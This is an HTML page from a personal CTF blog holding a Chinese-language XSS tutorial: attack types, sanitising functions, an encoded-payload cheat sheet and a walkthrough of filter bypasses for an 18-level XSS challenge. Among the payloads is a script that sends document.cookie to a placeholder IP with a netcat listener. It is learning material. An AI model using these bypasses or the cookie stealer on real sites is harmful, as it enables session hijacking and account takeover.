@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="CTF" />
+   
+  <meta name="description" content="CTFer,CUMT" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    xss |  Pz1o
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+<link rel="alternate" href="/atom.xml" title="Pz1o" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-xss"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  xss
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/12/09/xss/" class="article-date">
+  <time datetime="2020-12-09T15:34:13.000Z" itemprop="datePublished">2020-12-09</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">9 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>这篇更乱，也就那个小挑战还算完整</p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="理解同步和异步："><a href="#理解同步和异步：" class="headerlink" title="理解同步和异步："></a>理解同步和异步：</h3><p>举个例子，比如有一个网页，html和php，php会延时执行。</p>
+<p>同步：只有当php执行完之后，才会显示html网页。</p>
+<p>异步：刷新之后，会立即显示html网页，之后再显示php执行的内容。</p>
+<h3 id="js设置cookie"><a href="#js设置cookie" class="headerlink" title="js设置cookie"></a>js设置cookie</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;&quot;phpsessid&#x3D;      &quot;;</span><br></pre></td></tr></table></figure>
+<h2 id="0x01存储xss"><a href="#0x01存储xss" class="headerlink" title="0x01存储xss"></a>0x01存储xss</h2><p>存储型xss主要是攻击者将xss代码插入到页面上，然后存在数据库里，当访问者访问这个页面时，就会导致xss代码执行。</p>
+<p>出现场景：编辑内容（xss代码）可以保存，并且可以再次访问这个内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02反射xss"><a href="#0x02反射xss" class="headerlink" title="0x02反射xss"></a>0x02反射xss</h2><p>攻击者在url中插入xss代码，服务器将url中的xss代码输入到页面上，攻击者将xss代码的url发送给用户，用户打开后受到xss攻击。</p>
+<p>出现场景：url中可以传递参数</p>
+<p>通常来说，会闭合一些标签，从而执行代码。</p>
+<p>常用闭合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;</span><br><span class="line">&#39;&gt;</span><br><span class="line">&lt;&#x2F;xxx&gt;</span><br></pre></td></tr></table></figure>
+<p>其实还是具体情况具体对待</p>
+<h2 id="0x03dom型xss"><a href="#0x03dom型xss" class="headerlink" title="0x03dom型xss"></a>0x03dom型xss</h2><p>攻击者在url中插入xss代码，前端页面直接从url中获取xss代码并且输入到页面，导致xss代码的执行，攻击者将带有xss代码的url发送给用户，用户打开后受到xss攻击</p>
+<p>关于反射型和dom型差别：</p>
+<p>前端处理是dom，后端处理是反射</p>
+<h1 id="常用修复函数"><a href="#常用修复函数" class="headerlink" title="常用修复函数"></a>常用修复函数</h1><p>strip_tags：过滤html标签</p>
+<p>htmlspecialchars：将html标签转换为实体</p>
+<h1 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h1><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"x"</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">eval(</span>"<span class="attr">alert</span>('<span class="attr">xss</span>')")&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('xss')"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:aaa"</span> <span class="attr">onmouseover</span>=<span class="string">"alert(/xss/)"</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">需要用编码绕过时：</span><br><span class="line">Base64：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg</span>==&gt;</span>M</span><br><span class="line"></span><br><span class="line">urlencode：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%2829%29%3C%2F%73%63%72%69%70%74%3E</span>&gt;</span>M </span><br><span class="line"></span><br><span class="line">HTML实体编码 ：<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">j&amp;#x61;v&amp;#97script&amp;#x3A;&amp;#97lert(13)</span>&gt;</span>M</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">eval(alert(</span>'<span class="attr">xss</span>'))&gt;</span>bb<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>')&gt;</span>cc<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert('xss')<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4="</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"aaa"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript<span class="symbol">&amp;colon;</span>prompt<span class="symbol">&amp;lpar;</span>`xss`<span class="symbol">&amp;rpar;</span>"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onclick</span>=<span class="string">alert(</span>'<span class="attr">xss</span>') <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">xss</span>')&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"name"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>'<span class="attr">xss</span>') <span class="attr">bad</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> &gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie盗取：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxx.xxx.xxx.xxx:1234/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">nc监听端口1234</span><br></pre></td></tr></table></figure>
+<h1 id="xss编码"><a href="#xss编码" class="headerlink" title="xss编码"></a>xss编码</h1><h2 id="js编码"><a href="#js编码" class="headerlink" title="js编码"></a>js编码</h2><p>JS提供了四种字符编码的策略，</p>
+<ul>
+<li>三个八进制数字，如果数字不够，在前面补零，如a的编码为<code>\141</code></li>
+<li>两个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\x61</code></li>
+<li>四个十六进制数字，如果数字不够，在前面补零，如a的编码为<code>\u0061</code></li>
+<li>对于一些控制字符，使用特殊的C类型的转义风格，如<code>\n</code>和<code>\r</code></li>
+</ul>
+<h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><p><strong>命名实体</strong><br>以<code>&amp;</code>开头，以分号结尾的，如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>
+<p><strong>字符编码</strong></p>
+<p>十进制，十六进制的ASCII码或者Unicode字符编码。样式为<code>&amp;#</code>数值;</p>
+<p>如<code>&lt;</code>的编码为</p>
+<p><code>&lt;</code>(10进制)&amp;#60</p>
+<p><code>&lt;</code>(16进制)&amp;#x003c</p>
+<p><strong>URL编码</strong></p>
+<p>这里为url全编码，也就是两次url编码</p>
+<p>如alert的url全编码<code>为%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34</code></p>
+<p><strong>String.fromCharCode编码</strong></p>
+<p>如alert的编码为<code>String.fromCharCode(97,108,101,114,116)</code></p>
+<h1 id="xss挑战题"><a href="#xss挑战题" class="headerlink" title="xss挑战题"></a>xss挑战题</h1><p>做任何题都可以测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&quot;script on alert()&quot; href&gt;</span><br></pre></td></tr></table></figure>
+<p>做一下xss题</p>
+<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p><img src="/2020/12/09/xss/image-20200821200652133.png" alt="image-20200821200652133"></p>
+<p>可以发现test在h2标签处，直接写就可以只需要弹窗，就可以进入下一关</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;test&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="/2020/12/09/xss/image-20200821201141420.png" alt="image-20200821201141420"></p>
+<p><img src="/2020/12/09/xss/image-20200821201207838.png" alt="image-20200821201207838"></p>
+<p>对比可以发现，值直接在value处，所以<strong>只需要闭合标签即可</strong></p>
+<p><strong>搜索框里直接写</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>同时还有其他方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">需要鼠标划过输入框</span><br><span class="line">&quot; onmouseover&#x3D;alert(1)&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">需要点击搜索框</span><br><span class="line">&quot; onclick&#x3D;alert(1) &gt;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure>
+<h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这关进行了实体转义，<strong>也就是过滤了&lt;&gt;和””,</strong>所以我们可以利用单引号和注释符</p>
+<p>其中转义函数<img src="/2020/12/09/xss/image-20200821203827654.png" alt="image-20200821203827654"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#39; onclick&#x3D;alert(1)&#x2F;&#x2F;</span><br><span class="line">&#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p>和上一关一样，但需要注意的是<strong>双引号</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick&#x3D;alert(1) &quot;</span><br><span class="line">&quot; onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) autofocus&#x3D;&quot;</span><br><span class="line">&quot; onfocus&#x3D;alert(1) &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>这个关卡过滤了on，但没有过滤单双引号，<strong>所以可以用伪协议</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot;&gt; &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;111&lt;&#x2F;a&gt; &#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br><span class="line">&quot;&gt;&lt;iframe src&#x3D;javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>script 转换成 scr_ipt        on 转换成 o_n        src 转换成 sr_c        data 转换成 da_ta        href 转换成 hr_ef</p>
+<p><strong>但可以大小写绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;Script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&quot;&gt; &lt;a Href&#x3D;&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; Onclick&#x3D;alert(1) &quot;</span><br></pre></td></tr></table></figure>
+<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>过滤了script，on，href</p>
+<p><strong>所以可以双写绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef&#x3D;&quot;javascriscriptpt:alert(1)&quot;&gt;111&lt;&#x2F;a&gt;&#x2F;&#x2F;</span><br><span class="line">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;&#x2F;scriscriptpt&gt;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>script,on，src，data，href，大小写失效，”被编码所以value处几乎找不到</p>
+<p>但下面链接处可以看到 &lt;&gt; ‘ % # &amp; 未被过滤 看了别人题解之后是<strong>html实体编码绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(1)</span><br><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure>
+<h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>不了解，去看了源码是<strong>得加http://</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)&#x2F;&#x2F;http:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><p>这真想不出来</p>
+<p>试了三个参数，发现只有最后一个可以写入，<strong>直接构造</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot; type&#x3D;text onmouseover&#x3D;alert(1) &#x2F;&#x2F;</span><br><span class="line">&quot; type&#x3D;image src&#x3D;1 onerror&#x3D;alert(1)&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><p>这个题应该是抓包看，但由于我是谷歌做题，火狐抓包，导致每次直接复制11题url它都不会直接抓到ref头，正确应该是在10题向11题跳转时抓包。</p>
+<p><img src="/2020/12/09/xss/image-20200822205648946.png" alt="image-20200822205648946"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover&#x3D;alert(1) type&#x3D;&#39;text&#39;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p>把ref头改成这个，发包即可</p>
+<h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><p>有了上一个题的提示，这个题就明显很多了</p>
+<p>只要改一下UA头</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><p>这个应该是改cookie</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__cfduid&#x3D;d0d48515569060ded9a058127e163bb661598095904;user&#x3D;&quot; onmouseover&#x3D;alert(1) type&#x3D;&quot;text&quot; &#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><p>链接好像是挂掉了，但好像是没有太看懂，回头再来看一下</p>
+<h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><p>看源码发现</p>
+<p><img src="/2020/12/09/xss/image-20200822213204305.png" alt="image-20200822213204305"></p>
+<p>然后上网查一下</p>
+<p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件。</p>
+<p>包含的内容将作为指定元素的子节点。</p>
+<p><code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。</p>
+<p>默认情况下，包含的文件需要包含在<strong>同一个域名</strong>下。</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;&lt;span class&#x3D;&quot;ng-include:&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>
+<p>也就是说src包含的内容会进入ng-include被包含</p>
+<p>那我们可以想出能不能直接闭合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src&#x3D;&quot;&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<p>但发现直接被转义了，所以还是不行，只能包含第一关代码</p>
+<h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><p>这个题是把空格过滤了</p>
+<p>用%0d和%0a绕过</p>
+<p><strong>%0a换行符号”\n”<br>%0d回车符号”\r”</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img%0asrc&#x3D;1%0aonerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>就找源码和url之间的关系</p>
+<p>可以看见在src处有不同</p>
+<p>&lt;&gt;被过滤，考虑on事件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg02&#x3D; onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
+<h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><p>和17关一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;a%20&amp;arg02&#x3D;b onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- 反引号代替圆括号</span><br><span class="line">- 换行绕过正则</span><br><span class="line">- &lt;!--不仅可以用--&gt;,也可以用--!&gt;闭合</span><br><span class="line">- &#x2F;&#x2F;可以用换行来绕过</span><br><span class="line">- &lt;!--和--&gt;都可以在html的script标签里单独使用进行单行注释</span><br><span class="line">- ſ 符号转换为大写后正好为大写字母 S</span><br><span class="line">- 可以用 %0a 代替空格进行绕过</span><br></pre></td></tr></table></figure> 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://pz1o.top/2020/12/09/xss/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/" rel="tag">xss</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/12/09/SQL%E6%B3%A8%E5%85%A5/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            SQL注入
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/12/09/%E8%AE%A1%E7%BD%91/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">计网</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "KLWvKGPeSIyoEo4k6j3v37wy-gzGzoHsz",
+    app_key: "FL93w3BBbF9lxiR8X1HI58En",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020
+        <i class="ri-heart-fill heart_icon"></i> Pz1o
